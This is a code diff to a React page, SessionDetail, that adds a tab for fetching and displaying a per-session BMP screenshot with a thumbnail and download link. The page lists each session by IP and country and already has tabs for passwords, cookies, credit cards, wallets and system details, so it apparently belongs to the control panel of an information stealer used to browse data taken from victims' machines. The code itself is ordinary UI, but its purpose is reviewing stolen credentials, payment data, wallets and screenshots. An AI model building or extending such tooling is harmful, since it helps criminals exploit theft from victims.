@@ -1,8 +1,8 @@
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
 import { formatDistanceToNow } from 'date-fns'
-import { ArrowLeft, Eye, EyeOff, Key, Cookie, CreditCard, Wallet, FileText, Monitor, Server, Download, Trash2, MessageSquare } from 'lucide-react'
+import { ArrowLeft, Eye, EyeOff, Key, Cookie, CreditCard, Wallet, FileText, Monitor, Server, Download, Trash2, MessageSquare, Image } from 'lucide-react'
 import { api } from '@/lib/api'
 import { useI18n } from '@/lib/i18n'
 import { Button } from '@/components/ui/button'
@@ -39,6 +39,14 @@ export default function SessionDetail() {
   const navigate = useNavigate()
   const { t } = useI18n()
   const [revealed, setRevealed] = useState<Set<string>>(new Set())
+  const [activeTab, setActiveTab] = useState('passwords')
+  const [screenshotState, setScreenshotState] = useState<{
+    status: 'loading' | 'present' | 'absent' | 'gone'
+    width: number
+    height: number
+    sizeKb: number
+    objectUrl: string | null
+  }>({ status: 'loading', width: 0, height: 0, sizeKb: 0, objectUrl: null })
 
   const query = useQuery<SessionDetail>({
     queryKey: ['session', id],
@@ -76,6 +84,61 @@ export default function SessionDetail() {
       return next
     })
   }
+
+  // Fetch the screenshot as a blob (auth required, JWT lives in localStorage).
+  // The blob URL is set on screenshotState for use by both the header
+  // thumbnail and the tab body <img> tag.
+  useEffect(() => {
+    if (!id) return
+    const token = typeof window !== 'undefined' ? localStorage.getItem('token') : null
+    const headers: Record<string, string> = {}
+    if (token) headers['Authorization'] = `Bearer ${token}`
+    let cancelled = false
+    let blobUrl: string | null = null
+    fetch(`/api/sessions/${id}/screenshot`, { method: 'GET', headers })
+      .then(async (res) => {
+        if (cancelled) return
+        if (res.status === 404) {
+          setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        if (res.status === 410) {
+          setScreenshotState({ status: 'gone', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        if (!res.ok) {
+          setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+          return
+        }
+        const buf = new Uint8Array(await res.arrayBuffer())
+        const sizeBytes = Number(res.headers.get('Content-Length') ?? buf.length)
+        let w = 0
+        let h = 0
+        if (buf.length >= 30 && buf[0] === 0x42 && buf[1] === 0x4d) {
+          const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength)
+          if (dv.getUint32(14, true) >= 40) {
+            w = dv.getInt32(18, true)
+            h = dv.getInt32(22, true)
+          }
+        }
+        const blob = new Blob([buf], { type: res.headers.get('Content-Type') ?? 'image/bmp' })
+        blobUrl = URL.createObjectURL(blob)
+        setScreenshotState({
+          status: 'present',
+          width: w,
+          height: h,
+          sizeKb: Math.max(1, Math.round(sizeBytes / 1024)),
+          objectUrl: blobUrl,
+        })
+      })
+      .catch(() => {
+        if (!cancelled) setScreenshotState({ status: 'absent', width: 0, height: 0, sizeKb: 0, objectUrl: null })
+      })
+    return () => {
+      cancelled = true
+      if (blobUrl) URL.revokeObjectURL(blobUrl)
+    }
+  }, [id])
 
   if (query.isLoading) {
     return (
@@ -130,10 +193,28 @@ export default function SessionDetail() {
         </div>
       </div>
 
-      <div className="flex items-center gap-3">
-        <h1 className="text-2xl font-semibold tracking-tight font-mono">{session.ip}</h1>
-        <FlagIcon country={session.country_code ?? ''} width={24} height={24} />
-        <span className="text-sm text-muted-foreground font-mono">{session.country_code}</span>
+      <div className="flex items-center justify-between gap-3">
+        <div className="flex items-center gap-3">
+          <h1 className="text-2xl font-semibold tracking-tight font-mono">{session.ip}</h1>
+          <FlagIcon country={session.country_code ?? ''} width={24} height={24} />
+          <span className="text-sm text-muted-foreground font-mono">{session.country_code}</span>
+        </div>
+        {screenshotState.status !== 'absent' && screenshotState.status !== 'gone' && id && (
+          <button
+            type="button"
+            onClick={() => setActiveTab('screenshot')}
+            className="relative h-12 w-20 overflow-hidden rounded-md border border-border bg-muted hover:opacity-90 transition-opacity shrink-0"
+            aria-label={t('session.screenshot')}
+          >
+            {screenshotState.objectUrl && (
+              <img
+                src={screenshotState.objectUrl}
+                alt=""
+                className="h-full w-full object-cover"
+              />
+            )}
+          </button>
+        )}
       </div>
 
       <div className="flex flex-wrap gap-3 text-sm text-muted-foreground">
@@ -144,7 +225,7 @@ export default function SessionDetail() {
         <span>Created: <span className="font-mono text-foreground">{formatDistanceToNow(new Date(session.created_at), { addSuffix: true })}</span></span>
       </div>
 
-      <Tabs defaultValue="passwords">
+      <Tabs value={activeTab} onValueChange={setActiveTab}>
         <TabsList className="w-full justify-start bg-muted/60 border border-border p-1">
           <TabsTrigger value="passwords">
             <Key className="h-4 w-4 mr-1" />
@@ -169,6 +250,10 @@ export default function SessionDetail() {
           <TabsTrigger value="system">
             <Monitor className="h-4 w-4 mr-1" />
             {t('session.system')}
+          </TabsTrigger>
+          <TabsTrigger value="screenshot">
+            <Image className="h-4 w-4 mr-1" />
+            {t('session.screenshot')}
           </TabsTrigger>
           <TabsTrigger value="notes">
             <MessageSquare className="h-4 w-4 mr-1" />
@@ -464,6 +549,45 @@ export default function SessionDetail() {
           </div>
         </TabsContent>
 
+        <TabsContent value="screenshot">
+          <Card>
+            <CardContent className="pt-6">
+              {screenshotState.status === 'loading' ? (
+                <Skeleton className="w-full aspect-video rounded-md" />
+              ) : screenshotState.status === 'gone' ? (
+                <div className="text-sm text-muted-foreground">{t('session.screenshot_missing')}</div>
+              ) : screenshotState.status === 'absent' ? (
+                <div className="text-sm text-muted-foreground">{t('session.no_screenshot')}</div>
+              ) : (
+                <div className="space-y-3">
+                  <div className="relative w-full overflow-hidden rounded-md border border-border bg-muted">
+                    {screenshotState.objectUrl && (
+                      <img
+                        src={screenshotState.objectUrl}
+                        alt={t('session.screenshot')}
+                        className="w-full h-auto block"
+                      />
+                    )}
+                  </div>
+                  <div className="flex items-center justify-between text-xs text-muted-foreground">
+                    <div className="font-mono">
+                      {screenshotState.width}×{screenshotState.height} · {screenshotState.sizeKb} KB
+                    </div>
+                    <a
+                      href={screenshotState.objectUrl ?? '#'}
+                      target="_blank"
+                      rel="noreferrer"
+                      className="inline-flex items-center gap-1 hover:text-foreground"
+                      download={`screenshot-${id}.bmp`}
+                    >
+                      <Download className="h-3 w-3" /> {t('session.screenshot_open')}
+                    </a>
+                  </div>
+                </div>
+              )}
+            </CardContent>
+          </Card>
+        </TabsContent>
         <TabsContent value="notes">
           <Card>
             <CardContent className="space-y-4 pt-6">
